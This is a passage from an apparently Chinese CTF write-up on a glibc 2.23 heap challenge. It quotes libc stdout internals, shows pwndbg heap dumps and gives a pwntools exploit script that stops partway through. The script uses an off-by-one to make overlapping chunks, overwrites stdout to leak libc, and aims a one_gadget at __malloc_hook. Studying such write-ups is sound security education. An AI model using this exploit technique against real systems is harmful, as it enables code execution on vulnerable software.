class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>	count = to_do;<br>#ifdef _LIBC<br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> = __mempcpy (f-&gt;</span>_IO_write_ptr, s, count);<br>#<span class="hljs-keyword">else</span><br>      <span class="hljs-function"><span class="hljs-title">memcpy</span> (f-&gt;</span>_IO_write_ptr, s, count);<br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_write_ptr += count;<br>#endif<br>      s += count;<br>      to_do -= count;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      _IO_size_t block_size, do_write;<br>      <span class="hljs-comment">/* Next flush the (full) buffer. */</span><br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)	 <span class="hljs-comment">// 如果没有输出完，通过_IO_OVERFLOW刷新缓冲区或建立缓冲区</span><br>	<span class="hljs-comment">/* If nothing else has to be written we must not signal the</span><br><span class="hljs-comment">	   caller that everything has been written.  */</span><br>	return to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br><br>      <span class="hljs-comment">/* Try to maintain alignment: write a whole number of blocks.  */</span><br>      <span class="hljs-function"><span class="hljs-title">block_size</span> = f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_end</span> - f-&gt;</span>_IO_buf_base;<br>      do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br><br>      <span class="hljs-keyword">if</span> (do_write)<br>	&#123;<br>	  count = new_do_write (f, s, do_write);<br>	  to_do -= count;<br>	  <span class="hljs-keyword">if</span> (count &lt; do_write)<br>	    return n - to_do;<br>	&#125;<br><br>      <span class="hljs-comment">/* Now write out the remainder.  Normally, this will fit in the</span><br><span class="hljs-comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span><br><span class="hljs-comment">	 so we let _IO_default_xsputn handle the general case. */</span><br>      <span class="hljs-keyword">if</span> (to_do)<br>	to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br>    &#125;<br>  return n - to_do;<br>&#125;<br><br><span class="hljs-comment">// _IO_OVERFLOW默认对应的函数是_IO_new_file_overflow</span><br>int<br>_IO_new_file_overflow (_IO_FILE *f, int ch)<br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (f-&gt;</span>_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span><br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      return EOF;<br>    &#125;<br>  <span class="hljs-comment">/* If currently reading or no buffer allocated. */</span><br>  <span class="hljs-function"><span class="hljs-title">if</span> ((f-&gt;</span>_<span class="hljs-function"><span class="hljs-title">flags</span> &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;</span>_IO_write_base == NULL)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-function"><span class="hljs-title">if</span> (f-&gt;</span>_IO_write_base == NULL)<br>	&#123;<br>	  _IO_doallocbuf (f);<br>	  _IO_<span class="hljs-function"><span class="hljs-title">setg</span> (f, f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_base</span>, f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_base</span>, f-&gt;</span>_IO_buf_base);<br>	&#125;<br>      <span class="hljs-comment">/* Otherwise must be currently reading.</span><br><span class="hljs-comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span><br><span class="hljs-comment">	 logically slide the buffer forwards one block (by setting the</span><br><span class="hljs-comment">	 read pointers to all point at the beginning of the block).  This</span><br><span class="hljs-comment">	 makes room for subsequent output.</span><br><span class="hljs-comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span><br><span class="hljs-comment">	 alone, so it can continue to correspond to the external position). */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))<br>	&#123;<br>	  <span class="hljs-function"><span class="hljs-title">size_t</span> nbackup = f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_end</span> - f-&gt;</span>_IO_read_ptr;<br>	  _IO_free_backup_area (f);<br>	  <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_read_base -= MIN (nbackup,<br>				   <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_base</span> - f-&gt;</span>_IO_buf_base);<br>	  <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_ptr</span> = f-&gt;</span>_IO_read_base;<br>	&#125;<br><br>      <span class="hljs-function"><span class="hljs-title">if</span> (f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_ptr</span> == f-&gt;</span>_IO_buf_end)<br>	<span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_end</span> = f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_ptr</span> = f-&gt;</span>_IO_buf_base;<br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> = f-&gt;</span>_IO_read_ptr;<br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_base</span> = f-&gt;</span>_IO_write_ptr;<br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_end</span> = f-&gt;</span>_IO_buf_end;<br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_base</span> = f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_ptr</span> = f-&gt;</span>_IO_read_end;<br><br>      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-function"><span class="hljs-title">if</span> (f-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &lt;= 0 &amp;&amp; f-&gt;</span>_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>	<span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_end</span> = f-&gt;</span>_IO_write_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-function"><span class="hljs-title">return</span> _IO_do_write (f, f-&gt;</span>_IO_write_base,<br>			 <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> - f-&gt;</span>_IO_write_base);<br>  <span class="hljs-function"><span class="hljs-title">if</span> (f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> == f-&gt;</span>_IO_buf_end ) <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      return EOF;<br>  *<span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_write_ptr++ = ch;<br>  <span class="hljs-function"><span class="hljs-title">if</span> ((f-&gt;</span>_flags &amp; _IO_UNBUFFERED)<br>      || ((<span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="hljs-string">&#x27;\n&#x27;</span>))<br>    <span class="hljs-function"><span class="hljs-title">if</span> (_IO_do_write (f, f-&gt;</span>_IO_write_base,<br>		      <span class="hljs-function"><span class="hljs-title">f</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> - f-&gt;</span>_IO_write_base) == EOF)<br>      return EOF;<br>  return (unsigned char) ch;<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br>    <br>    <br># define _IO_new_do_write _IO_do_write<br><span class="hljs-comment">// _IO_new_do_write调用new_do_write</span><br>    static<br>_IO_size_t<br>new_do_write (_IO_FILE *fp, const char *<span class="hljs-keyword">data</span>, _IO_size_t to_do)<br>&#123;<br>  _IO_size_t count;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_flags &amp; _IO_IS_APPENDING)<br>    <span class="hljs-comment">/* On a system without a proper O_APPEND implementation,</span><br><span class="hljs-comment">       you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="hljs-comment">       not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="hljs-comment">       Instead, just indicate that offset (before and after) is</span><br><span class="hljs-comment">       unpredictable. */</span><br>    <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_offset = _IO_pos_BAD;<br>  <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_end</span> != fp-&gt;</span>_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>	= _IO_SYSSEEK (<span class="hljs-function"><span class="hljs-title">fp</span>, fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_base</span> - fp-&gt;</span>_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br>	return <span class="hljs-number">0</span>;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_offset = new_pos;<br>    &#125;<br>  count = _IO_SYSWRITE (fp, <span class="hljs-keyword">data</span>, to_do);<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_cur_column &amp;&amp; count)<br>    <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">cur_column</span> = _IO_adjust_column (fp-&gt;</span>_cur_column - <span class="hljs-number">1</span>, <span class="hljs-keyword">data</span>, count) + <span class="hljs-number">1</span>;<br>  _IO_<span class="hljs-function"><span class="hljs-title">setg</span> (fp, fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_base</span>, fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_base</span>, fp-&gt;</span>_IO_buf_base);<br>  <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_base</span> = fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> = fp-&gt;</span>_IO_buf_base;<br>  <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_end</span> = (fp-&gt;</span>_mode &lt;= <span class="hljs-number">0</span><br>		       &amp;&amp; (<span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>		       ? <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_base</span> : fp-&gt;</span>_IO_buf_end);<br>  return count;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="hljs-comment">/* Magic number */</span></span><br>......<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br>......<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING 0x1000</span><br>......<br>    <br><span class="hljs-comment">// 所以要使执行_IO_SYSWRITE，flag设置为0xfbad1800</span><br>    <br><span class="hljs-comment">// 同时，设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址(不需要一定设置指向结尾，程序中自带地址足够泄露libc</span><br></code></pre></td></tr></table></figure>



![](../img\QQ截图20240504192519.png)
</code></pre>
</li>
<li></li>
<li><blockquote>
<p>从fastbin中重新malloc时需要size一样，而不是分割</p>
<p>unsortedbin中重新分配</p>
</blockquote>
</li>
<li><pre><code class="python">pwndbg&gt; heap
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.
&#39;&#39;&#39;pagestart &amp; notestart
Allocated chunk | PREV_INUSE
Addr: 0x141c000
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x141c030
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x141c060
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x141c090
Size: 0x30 (with flag bits: 0x31)
&#39;&#39;&#39;

Free chunk (fastbins) | PREV_INUSE # free
Addr: 0x141c0c0
Size: 0x30 (with flag bits: 0x31)
fd: 0x141c0f0

Free chunk (fastbins) | PREV_INUSE  # free
Addr: 0x141c0f0
Size: 0x30 (with flag bits: 0x31)
fd: 0x00

Allocated chunk | PREV_INUSE #  note10
Addr: 0x141c120
Size: 0x30 (with flag bits: 0x31)

Free chunk (fastbins) | PREV_INUSE # free
Addr: 0x141c150
Size: 0x30 (with flag bits: 0x31)
fd: 0x141c0c0

Allocated chunk | PREV_INUSE # note8
Addr: 0x141c180
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE # note9
Addr: 0x141c1b0
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE # note6
Addr: 0x141c1e0
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE # note7
Addr: 0x141c210
Size: 0x30 (with flag bits: 0x31)

 &#39;&#39;&#39;note_protect
Allocated chunk | PREV_INUSE 
Addr: 0x141c240
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x141c270
Size: 0x20 (with flag bits: 0x21)
&#39;&#39;&#39;

Allocated chunk | PREV_INUSE # note6_content
Addr: 0x141c290
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE # note7_content
Addr: 0x141c2b0
Size: 0x100 (with flag bits: 0x101)

Allocated chunk | PREV_INUSE # note8_content
Addr: 0x141c3b0
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE # note9_content
Addr: 0x141c420
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE # note10_content
Addr: 0x141c490
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x141c4b0
Size: 0x20b50 (with flag bits: 0x20b51)

<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><br>```python<br>Allocated chunk | PREV_INUSE # note6_content<br><span class="hljs-symbol">Addr:</span> <span class="hljs-number">0</span>x1af8290<br><span class="hljs-symbol">Size:</span> <span class="hljs-number">0</span>x20 (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0</span>x21)<br><br><span class="hljs-comment">&#x27;&#x27;&#x27;offbyone overlapping789</span><br>Allocated chunk | PREV_INUSE       ---------&gt;chunkb<br><span class="hljs-symbol">Addr:</span> <span class="hljs-number">0</span>x1af82b0<br><span class="hljs-symbol">Size:</span> <span class="hljs-number">0</span>xe0 (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0</span>xe1)<br><br>Free chunk (fastbins) | PREV_INUSE    ------&gt;chunka<br><span class="hljs-symbol">Addr:</span> <span class="hljs-number">0</span>x1af8390<br><span class="hljs-symbol">Size:</span> <span class="hljs-number">0</span>x20 (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0</span>x21)<br><span class="hljs-symbol">fd:</span> <span class="hljs-number">0</span>x00<br><br>Allocated chunk | PREV_INUSE<br><span class="hljs-symbol">Addr:</span> <span class="hljs-number">0</span>x1af83b0<br><span class="hljs-symbol">Size:</span> <span class="hljs-number">0</span>x20 (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0</span>x21)<br><br>Free chunk (unsortedbin) | PREV_INUSE<br><span class="hljs-symbol">Addr:</span> <span class="hljs-number">0</span>x1af83d0<br><span class="hljs-symbol">Size:</span> <span class="hljs-number">0</span>xc0 (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0</span>xc1)<br><span class="hljs-symbol">fd:</span> <span class="hljs-number">0</span>x780d19dc3b78<br><span class="hljs-symbol">bk:</span> <span class="hljs-number">0</span>x780d19dc3b78<br><span class="hljs-comment">&#x27;&#x27;&#x27;</span><br><br>Allocated chunk<br><span class="hljs-symbol">Addr:</span> <span class="hljs-number">0</span>x1af8490<br><span class="hljs-symbol">Size:</span> <span class="hljs-number">0</span>x20 (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0</span>x20)<br><br>Top chunk | PREV_INUSE<br><span class="hljs-symbol">Addr:</span> <span class="hljs-number">0</span>x1af84b0<br><span class="hljs-symbol">Size:</span> <span class="hljs-number">0</span>x20b50 (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0</span>x20b51)<br><br></code></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_page</span>():<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_page</span>(<span class="hljs-params">idex</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(indx))  <span class="hljs-comment"># 从1开始</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_note</span>(<span class="hljs-params">page_idex, size, content</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(page_idex))<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>	io.sendafter(<span class="hljs-string">&quot;&gt;&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_note</span>(<span class="hljs-params">page_id, note_id</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(page_id))<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(note_id))<br><br><span class="hljs-comment">#-----------调整堆使连续存放---------</span><br><span class="hljs-comment"># add_page()</span><br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br>delete_note(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>delete_note(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)<br>delete_note(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>)<br>delete_note(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>)<br><br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;6&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;7&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;8&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;9&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;10&#x27;</span>)<br><br><span class="hljs-comment">#----------offbyone-------------</span><br>delete_note(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>)<br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\xe1&#x27;</span>) <span class="hljs-comment"># overlapping7 8 9</span><br>delete_note(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>) <span class="hljs-comment"># 0x1e0的chunk进入unsortedbin</span><br>delete_note(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>)<br><br>add_note(<span class="hljs-number">0</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;b&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add_note(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\xdd\x45&#x27;</span>) <span class="hljs-comment"># fd=_IO_2_1_stderr_+157</span><br><br>delete_note(<span class="hljs-number">0</span>,<span class="hljs-number">13</span>)<span class="hljs-comment"># chunk_a</span><br>add_note(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x71&#x27;</span>) <span class="hljs-comment"># pass check</span><br><br>add_note(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<span class="hljs-comment">#</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag 0xfbad1800</span><br><span class="hljs-string">_IO_read_ptr 0</span><br><span class="hljs-string">_IO_read_end 0</span><br><span class="hljs-string">_IO_read_base 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add_note(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x33</span>+p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x58&#x27;</span>)<span class="hljs-comment">#修改stdout </span><br><span class="hljs-built_in">print</span>(io.recv(<span class="hljs-number">6</span>))<br>stdout = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">131</span><br><span class="hljs-comment"># stdout = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 131</span><br>base = stdout - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base=&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br><br>malloc_hook = base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>ogg = [<span class="hljs-number">0x45206</span>, <span class="hljs-number">0x4525a</span>, <span class="hljs-number">0xef9f4</span>, <span class="hljs-number">0xf0897</span>]<br>onegadget = base + ogg[<span class="hljs-number">3</span>]<br><br><span class="hljs-comment">#----------malloc_hook---------</span><br>add_page() <span class="hljs-comment"># 这里可以重新add一个page就更清楚啦</span><br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)<br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)<br><br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;6&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;7&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;8&#x27;</span>)<br>add_note(<span 